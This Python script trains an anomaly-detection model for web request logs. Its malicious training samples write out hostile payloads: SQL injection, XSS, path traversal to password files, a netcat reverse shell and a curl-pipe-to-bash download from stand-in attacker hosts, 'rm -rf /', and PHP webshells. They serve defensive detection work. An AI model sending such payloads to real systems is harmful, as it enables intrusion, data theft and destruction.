#!/usr/bin/env python3

#Train ML Models for Threat Detection :)


import os
import joblib
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import IsolationForest
from sklearn.model_selection import train_test_split

print("🤖 Training ML Models for Threat Detection")
print("=" * 60)

# Create models directory
os.makedirs("models", exist_ok=True)



# BENIGN traffic samples (
benign_logs = [
    "GET /api/health HTTP/1.1 User-Agent: Mozilla/5.0",
    "POST /api/login HTTP/1.1 username=john password=hashed_value",
    "GET /api/users/profile HTTP/1.1 Authorization: Bearer token123",
    "GET /static/css/style.css HTTP/1.1",
    "GET /api/products?category=electronics HTTP/1.1",
    "POST /api/comments HTTP/1.1 comment=Great product!",
    "GET /api/orders/12345 HTTP/1.1",
    "PUT /api/users/settings HTTP/1.1 theme=dark",
    "GET /images/logo.png HTTP/1.1",
    "POST /api/contact HTTP/1.1 email=user@example.com",
    "GET /api/dashboard HTTP/1.1",
    "GET /api/notifications HTTP/1.1",
    "POST /api/logout HTTP/1.1",
    "GET /api/search?q=laptop HTTP/1.1",
    "GET /api/cart HTTP/1.1",
    "POST /api/checkout HTTP/1.1",
    "GET /docs/index.html HTTP/1.1",
    "GET /api/status HTTP/1.1",
    "GET /favicon.ico HTTP/1.1",
    "GET /robots.txt HTTP/1.1",
]

# MALICIOUS traffic sample
malicious_logs = [
    # SQL Injection
    "GET /api/users?id=1' OR '1'='1'-- HTTP/1.1",
    "POST /login username=admin' OR 1=1-- password=x",
    "GET /products?id=1 UNION SELECT username,password FROM users--",
    "GET /search?q='; DROP TABLE users; --",
    "POST /api/query sql=SELECT * FROM admin WHERE '1'='1",
    
    # XSS Attacks
    "POST /comment body=<script>alert('XSS')</script>",
    "GET /search?q=<script>document.location='http://evil.com'</script>",
    "POST /profile name=<img src=x onerror=alert(1)>",
    "GET /page?redirect=javascript:alert(document.cookie)",
    "POST /comment <iframe src=http://attacker.com></iframe>",
    
    # Path Traversal
    "GET /download?file=../../../../etc/passwd HTTP/1.1",
    "GET /files?path=../../windows/system32/config/sam",
    "POST /upload filename=../../../var/www/shell.php",
    "GET /api/file?name=..%2F..%2Fetc%2Fshadow",
    "GET /download?file=....//....//etc/passwd",
    
    # Command Injection
    "GET /ping?host=8.8.8.8; cat /etc/passwd HTTP/1.1",
    "POST /exec cmd=ls -la; nc attacker.com 4444 -e /bin/bash",
    "GET /api/ping?ip=127.0.0.1 | whoami",
    "POST /system command=rm -rf / --no-preserve-root",
    "GET /shell?cmd=`curl http://evil.com/backdoor.sh | bash`",
    
    # LDAP Injection
    "POST /login username=*)(uid=*))(|(uid=* password=x",
    "GET /search?filter=(&(uid=*)(userPassword=*))",
    
    # Malware/Webshell
    "POST /upload content=<?php eval($_POST['cmd']); ?>",
    "GET /shell.php?cmd=system('cat /etc/passwd')",
    "POST /backdoor <?php system($_GET['c']); ?>",
    "POST /upload file=<?php passthru($_GET['cmd']); ?>",
    
    # Scanner/Enumeration
    "GET /admin/ HTTP/1.1 User-Agent: Nikto/2.1.6",
    "GET /config.php HTTP/1.1 User-Agent: sqlmap/1.5",
    "GET /.git/config HTTP/1.1 User-Agent: WPScan",
    "GET /phpmyadmin/ HTTP/1.1 User-Agent: Metasploit",
]

# Combine all training data
all_logs = benign_logs + malicious_logs
labels = [0] * len(benign_logs) + [1] * len(malicious_logs)  # 0=benign, 1=malicious

print(f"\n📊 Training Data:")
print(f"   Benign samples: {len(benign_logs)}")
print(f"   Malicious samples: {len(malicious_logs)}")
print(f"   Total samples: {len(all_logs)}")


print("\n🔧 Training TF-IDF Vectorizer...")

vectorizer = TfidfVectorizer(
    max_features=500,          
    ngram_range=(1, 3),         
    analyzer='char',            
    min_df=1,                  
    max_df=0.9,                 
    lowercase=True,
    strip_accents='unicode',
    token_pattern=r'\b\w+\b'
)

# Fit the vectorizer on all logs
X = vectorizer.fit_transform(all_logs)
print(f"   ✅ Vectorizer trained with {X.shape[1]} features")

# Show some learned features
feature_names = vectorizer.get_feature_names_out()
print(f"   Example features: {feature_names[:10].tolist()}")

# Save vectorizer
vectorizer_path = "models/tfidf_vectorizer.pkl"
joblib.dump(vectorizer, vectorizer_path)
print(f"   ✅ Saved to: {vectorizer_path}")


print("\n🔧 Training Isolation Forest (Anomaly Detection)...")


model = IsolationForest(
    contamination=0.3,          
    n_estimators=100,           
    max_samples='auto',         
    random_state=42,            
    n_jobs=-1                  
)


model.fit(X)
print(f"   ✅ Model trained with {model.n_estimators} trees")


model_path = "models/anomaly_model.pkl"
joblib.dump(model, model_path)
print(f"   ✅ Saved to: {model_path}")


print("\n🧪 Testing Model Performance...")

# Predict anomaly scores 
scores = model.decision_function(X)
predictions = model.predict(X) 


predicted_labels = [1 if p == -1 else 0 for p in predictions]
accuracy = sum(p == l for p, l in zip(predicted_labels, labels)) / len(labels)

print(f"   Accuracy: {accuracy * 100:.1f}%")

# Test on specific examples
print("\n📝 Example Predictions:")
test_cases = [
    ("Normal request", "GET /api/users HTTP/1.1"),
    ("SQL Injection", "admin' OR 1=1--"),
    ("XSS Attack", "<script>alert(1)</script>"),
    ("Path Traversal", "../../etc/passwd"),
]

for name, payload in test_cases:
    X_test = vectorizer.transform([payload])
    score = model.decision_function(X_test)[0]
    prediction = model.predict(X_test)[0]
    
    # Convert score to risk (0-100 scale)
    risk_score = max(min((1 - score) * 100, 100.0), 0.0)
    status = "🚨 THREAT" if prediction == -1 else "✅ SAFE"
    
    print(f"   {status} {name:20s} | Risk: {risk_score:5.1f}")


print("\n📊 Model Statistics:")
print(f"   Model type: Isolation Forest")
print(f"   Feature dimension: {X.shape[1]}")
print(f"   Training samples: {X.shape[0]}")
print(f"   Contamination rate: 30%")
print(f"   Number of estimators: 100")


print("\n🔍 Top Features Indicating Threats:")

malicious_X = X[len(benign_logs):]  
benign_X = X[:len(benign_logs)]    

# Calculate mean TF-IDF scores for each class
malicious_mean = np.asarray(malicious_X.mean(axis=0)).flatten()
benign_mean = np.asarray(benign_X.mean(axis=0)).flatten()

# Find features more common in malicious traffic
diff = malicious_mean - benign_mean
top_threat_indices = np.argsort(diff)[-10:][::-1]

for idx in top_threat_indices:
    feature = feature_names[idx]
    mal_score = malicious_mean[idx]
    ben_score = benign_mean[idx]
    print(f"   '{feature}' - Malicious: {mal_score:.3f}, Benign: {ben_score:.3f}")

print("\n" + "=" * 60)
print("✅ ML Models Training Complete!")
print("=" * 60)
print("\n📦 Generated files:")
print(f"   1. models/tfidf_vectorizer.pkl ({os.path.getsize(vectorizer_path) / 1024:.1f} KB)")
print(f"   2. models/anomaly_model.pkl ({os.path.getsize(model_path) / 1024:.1f} KB)")
print("\n🚀 Next steps:")
print("   1. Restart detection service: python detection_service.py")
print("   2. Models will be loaded automatically")
print("   3. ML-based detection will be enabled")
print("   4. Check logs for: 'ML models loaded successfully'")
print("\n" + "=" * 60)
